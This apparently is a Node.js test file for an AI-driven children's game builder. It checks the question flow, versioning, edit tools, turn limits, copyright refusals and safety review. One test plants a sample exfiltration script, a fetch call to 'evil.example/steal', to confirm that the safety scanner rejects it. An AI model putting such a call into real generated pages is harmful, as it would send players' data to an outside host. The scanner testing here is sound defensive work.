// Builder harness at the service level, with the mock provider (no API key).
process.env.BRB_DB = ':memory:';
process.env.BRB_SILENT = '1';
process.env.LOG_REQUESTS = '0';
process.env.BRB_MOCK_DELAY_MS = '0';
process.env.BRB_DATA_DIR = process.env.BRB_DATA_DIR || (await import('node:os')).tmpdir() + '/brb-builder-test-' + process.pid;
import test from 'node:test';
import assert from 'node:assert/strict';

const { config } = await import('../../server/config.js');
config.anthropicKey = '';
const { q } = await import('../../server/db.js');
const auth = await import('../../server/auth.js');
const games = await import('../../server/services/games.js');
const { runTurn } = await import('../../server/builder/agent.js');
const { loadChat } = await import('../../server/builder/chat.js');
const { applyEdits, toolbox } = await import('../../server/builder/tools.js');
const { historyToMessages } = await import('../../server/builder/claude.js');
const { reviewVersion } = await import('../../server/services/review.js');
const { sourceBlock, SYSTEM_PROMPT, TOOLS } = await import('../../server/builder/prompt.js');

let n = 0;
const newUser = () => auth.createUser({ username: `Builder_${String.fromCharCode(97 + (n++ % 26))}${'xyz'[n % 3]}${n}`.slice(0, 16), password: 'secret1' });
async function turn(user, gameId, text, extra = {}) {
  const events = [];
  const r = await runTurn({ user, gameId, text, emit: (name, data) => events.push([name, data]), ...extra });
  const of = name => events.filter(e => e[0] === name).map(e => e[1]);
  return { r, events, of, text: of('text').map(d => d.text).join('') };
}
const versions = id => games.listVersions(id).sort((a, b) => a.number - b.number);

test('mock flow: questions -> write_game v1 -> edit v2 -> restore v3 = copy of v1', async () => {
  const u = newUser(); const g = games.createGame(u.id, { title: 'Untitled' });
  let t = await turn(u, g.id, 'hi');
  assert.equal(t.of('ask').length, 1, 'asks what kind of game');
  const kinds = t.of('ask')[0].options;
  assert.ok(kinds.length >= 6 && kinds.length <= 8, '6-8 idea chips');
  assert.equal(versions(g.id).length, 0, 'no game yet');
  assert.ok(t.of('text').length > 1, 'text is streamed in chunks');

  t = await turn(u, g.id, kinds.find(k => /catch/i.test(k)));
  assert.equal(t.of('ask').length, 1, 'asks about the theme'); assert.equal(versions(g.id).length, 0);

  t = await turn(u, g.id, '🦈 Sharks');
  assert.equal(t.of('version').length, 1, 'builds version 1');
  assert.equal(t.of('meta')[0].title, 'Shark Catch');
  assert.equal(t.of('notes').length, 1, 'test notes');
  const next = t.of('ask')[0].options; assert.equal(next.length, 3, 'three next-step chips');
  assert.match(t.text, /plan/i);
  const v1 = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v1.number, 1); assert.equal(v1.safety_status, 'pass', v1.safety_report);
  assert.match(v1.html, /<title>Shark Catch<\/title>/);

  t = await turn(u, g.id, 'Make it harder');
  assert.equal(t.of('version').length, 1);
  const v2 = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v2.number, 2); assert.notEqual(v2.html, v1.html);
  assert.match(v2.html, /BRB_TUNE\.speed = 1\.25;/);
  assert.equal(v2.safety_status, 'pass');

  const v3 = games.restoreVersion(g.id, v1.id, u.id);
  assert.equal(v3.number, 3); assert.equal(v3.html, v1.html); assert.match(v3.notes, /Restored version 1/);
  assert.deepEqual(versions(g.id).map(v => v.number), [1, 2, 3], 'history is never rewritten');

  t = await turn(u, g.id, 'change the hero to a dragon and make it pink');
  const v4 = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v4.number, 4); assert.match(v4.html, /BRB_TUNE\.hero = \[".+","🐉"\];/u); assert.match(v4.html, /BRB_TUNE\.tint = "#ff5fb0";/);
  assert.equal(games.getGame(g.id).icon, '🐉');

  t = await turn(u, g.id, "it's ready!");
  assert.equal(t.of('version').length, 0, 'polish pass does not need a new version');
  assert.ok(t.of('notes')[0].checklist.length >= 5);
});

test('mock asks at most three questions and skips what the message already says', async () => {
  const u = newUser();
  const g1 = games.createGame(u.id, {});
  const t = await turn(u, g1.id, 'a spelling game about dinosaurs');
  assert.equal(t.of('ask').length > 0 && t.of('version').length === 0 ? 'asked' : 'built', 'built', 'enough info: builds straight away');
  assert.equal(games.getGame(g1.id).title, 'Dino Words');

  const g2 = games.createGame(u.id, {}); let asks = 0;
  for (const msg of ['hello', 'hmm', 'whatever', 'anything', 'ok']) {
    const r = await turn(u, g2.id, msg);
    if (r.of('version').length) break;
    asks += r.of('ask').length;
  }
  assert.ok(asks <= 3, `asked ${asks} questions`);
  assert.equal(versions(g2.id).length, 1, 'built after the questions');
});

test('edit_game: find must match exactly once; failures are reported to the model and make no version', () => {
  assert.deepEqual(applyEdits('a b c', [{ find: 'b', replace: 'B' }]), { ok: true, html: 'a B c' });
  assert.match(applyEdits('a b b', [{ find: 'b', replace: 'B' }]).error, /appears 2 times/);
  assert.match(applyEdits('a b c', [{ find: 'z', replace: 'Z' }]).error, /not found/);
  assert.match(applyEdits('a b c', []).error, /non-empty/);
  assert.equal(applyEdits('a b c', [{ find: 'b', replace: 'x' }, { find: 'x', replace: 'y' }]).html, 'a y c', 'edits apply in order');
  assert.equal(applyEdits('a b c', [{ find: 'b', replace: 'x' }, { find: 'q', replace: 'y' }]).ok, false, 'all or nothing');

  const u = newUser(); const g = games.createGame(u.id, {});
  const events = []; const tb = toolbox({ user: u, gameId: g.id, emit: (a, b) => events.push([a, b]), state: {} });
  assert.match(tb.exec('edit_game', { edits: [{ find: 'x', replace: 'y' }], notes: 'n' }).forModel, /no game yet/i);
  const ok = tb.exec('write_game', { html: '<title>T</title><style>b{}</style><canvas></canvas><script>let speed = 1; BRB.sfx.play("win")</script>', notes: 'first' });
  assert.equal(ok.ok, true); assert.equal(ok.version.number, 1);
  const bad = tb.exec('edit_game', { edits: [{ find: 'speed = 2', replace: 'speed = 3' }], notes: 'n' });
  assert.equal(bad.ok, false); assert.match(bad.forModel, /No changes were made/);
  const good = tb.exec('edit_game', { edits: [{ find: 'speed = 1', replace: 'speed = 2' }], notes: 'faster' });
  assert.equal(good.ok, true); assert.equal(good.version.number, 2); assert.match(good.version.html, /speed = 2/);
  assert.equal(versions(g.id).length, 2);
});

test('a failing scan is fed back to the model, and the version is kept with its status', () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const state = {}; const tb = toolbox({ user: u, gameId: g.id, emit: () => {}, state });
  const r = tb.exec('write_game', { html: '<title>x</title><script>fetch("https://evil.example/steal")</script>', notes: 'bad' });
  assert.equal(r.ok, false); assert.match(r.forModel, /FAILED/); assert.match(r.forModel, /fetch/);
  assert.equal(r.version.safety_status, 'fail'); assert.equal(state.scanFails, 1);
});

test('set_game cleans text and validates fields', () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const tb = toolbox({ user: u, gameId: g.id, emit: () => {}, state: {} });
  const r = tb.exec('set_game', { title: 'shit game', icon: 'abc', category: 'nope', description: 'Call 555 123 4567', players: 99 });
  assert.match(r.forModel, /title was not allowed/); assert.match(r.forModel, /icon must be one emoji/);
  const after = games.getGame(g.id); assert.notEqual(after.title, 'shit game'); assert.equal(after.players_max, 8);
  tb.exec('set_game', { title: 'Space Hop', icon: '🚀', category: 'arcade', tags: ['space', 'jump'] });
  assert.equal(games.getGame(g.id).title, 'Space Hop'); assert.equal(games.getGame(g.id).tags, 'space,jump');
});

test('daily turn limit: refused when used up; refusals do not use turns', async () => {
  const old = config.builderDailyTurns; config.builderDailyTurns = 2;
  try {
    const u = newUser(); const g = games.createGame(u.id, {});
    await turn(u, g.id, 'make a minecraft game'); // refused, free
    let t = await turn(u, g.id, 'hi'); assert.equal(t.r.turnsLeft, 1);
    t = await turn(u, g.id, 'a catch game with robots'); assert.equal(t.r.turnsLeft, 0); assert.equal(versions(g.id).length, 1);
    t = await turn(u, g.id, 'make it harder');
    assert.equal(t.r.error, 'limit'); assert.match(t.of('error')[0].message, /all 2 Builder turns/);
    assert.equal(versions(g.id).length, 1, 'nothing built past the limit');
  } finally { config.builderDailyTurns = old; }
});

test('screening refusals are kind, audited, and never reach the provider', async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const t = await turn(u, g.id, 'make a pokemon game with pikachu');
  assert.equal(t.r.refused, 'copyright');
  const ref = t.of('refused')[0]; assert.match(ref.message, /belongs to someone else/); assert.ok(ref.suggestion && ref.chips.length);
  assert.equal(t.of('version').length + t.of('ask').length, 0, 'the Builder never saw it');
  const a = q.get("SELECT * FROM audit_log WHERE action='builder.refused' AND actor_id=?", u.id);
  assert.ok(a, 'audited'); assert.match(a.details, /copyright/);
  const chat = loadChat(g.id);
  assert.equal(chat.messages[0].refused, true);
  assert.deepEqual(historyToMessages(chat.messages), [], 'refused messages are not sent to the model later');
});

test('the stored transcript never contains game source; the model gets it as a separate block', async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  await turn(u, g.id, 'a runner game with a fox');
  await turn(u, g.id, 'make it faster');
  const chat = loadChat(g.id); const json = JSON.stringify(chat.messages);
  assert.doesNotMatch(json, /<script|<style|BRB_TUNE|requestAnimationFrame|\/frame\//);
  assert.ok(chat.messages.some(m => (m.events || []).some(e => e[0] === 'version')), 'actions are summarised');
  const hist = historyToMessages(chat.messages);
  assert.equal(hist[0].role, 'user');
  assert.match(JSON.stringify(hist), /Built version 2/);
  assert.doesNotMatch(JSON.stringify(hist), /<script/);
  const v = games.getVersion(games.getGame(g.id).current_version_id);
  assert.match(sourceBlock(v, games.getGame(g.id)), /<current_game>[\s\S]*<script/);
  assert.match(sourceBlock(null, g), /none yet/);
});

test('system prompt and tools are fixed and cover the kid rules and the contract', () => {
  for (const s of ['No chat or messaging between players', 'personal details', 'No links', 'real brands', 'jump-scares', 'gambling', 'Cartoon slapstick', 'Educational', 'window.BRB', '<title>', 'BRB.sfx', 'three short questions', 'never put the uploaded photo', 'playtest_game', '__brbTest', 'Art direction', 'start()']) assert.ok(SYSTEM_PROMPT.toLowerCase().includes(s.toLowerCase()), s);
  assert.deepEqual(TOOLS.map(t => t.name), ['ask_user', 'write_game', 'edit_game', 'set_game', 'playtest_game', 'test_notes']);
  assert.doesNotMatch(SYSTEM_PROMPT, /\$\{/);
});

test('model review: unavailable without a key, never auto-approves a flagged version', async () => {
  const g = { title: 'X', description: '', tags: '', category: 'arcade' };
  let r = await reviewVersion(g, { html: '<title>x</title>', safety_status: 'pass', safety_report: '{}' });
  assert.equal(r.verdict, 'unavailable');
  const old = config.anthropicKey; config.anthropicKey = 'sk-test-not-used';
  try {
    r = await reviewVersion(g, { html: '<title>x</title>', safety_status: 'flag', safety_report: '{"issues":[{"level":"flag","message":"Hidden text"}]}' });
    assert.equal(r.verdict, 'unavailable'); assert.match(r.reasons[0], /person will check/);
    r = await reviewVersion(g, { html: '<title>x</title>', safety_status: 'fail', safety_report: '{}' });
    assert.equal(r.verdict, 'blocked');
  } finally { config.anthropicKey = old; }
});
